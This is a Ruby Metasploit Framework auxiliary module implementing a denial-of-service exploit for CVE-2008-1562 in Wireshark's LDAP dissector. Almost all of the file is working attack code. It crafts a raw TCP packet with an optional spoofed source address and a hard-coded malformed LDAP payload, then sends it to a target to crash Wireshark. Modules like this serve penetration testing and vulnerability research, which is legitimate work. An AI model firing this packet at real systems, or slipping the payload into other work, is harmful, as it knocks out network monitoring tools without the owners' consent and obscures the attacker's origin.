##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Dos
			
	def initialize
		super(
			'Name'        => 'Wireshark LDAP dissector DOS',
			'Description' => %q{
					The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers
					to cause a denial of service (application crash) via a malformed packet.
			},
			'Author'      => ['MC'],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$',
			'References'  =>
				[
					[ 'CVE', '2008-1562' ],
				],
			'DisclosureDate' => 'Mar 28 2008')		
			
		register_options([
			OptInt.new('RPORT', [true, 'The destination port', 389]),
			OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
		], self.class)
	
	end

	def run

		print_status("Sending malformed LDAP packet to #{rhost}")

		m = Rex::Text.rand_text_alpha_lower(3)
		
		open_pcap

		n = Racket::Racket.new

		n.l3 = Racket::L3::IPv4.new
		n.l3.src_ip = datastore['SHOST'] || Rex::Socket.source_address(rhost)
		n.l3.dst_ip = rhost
		n.l3.protocol = 6
		n.l3.id = rand(0x10000)
		n.l3.ttl = 64
		
		n.l4 = Racket::L4::TCP.new
		n.l4.src_port = rand(65535)+1
		n.l4.seq = rand(0x100000000)
		n.l4.ack = rand(0x100000000)
		n.l4.flag_psh = 1
		n.l4.flag_ack = 1
		n.l4.dst_port = datastore['RPORT'].to_i
		n.l4.window = 3072
		n.l4.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"

		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	
	
		pkt = n.pack

		capture_sendto(pkt, rhost)

		close_pcap

	end

end
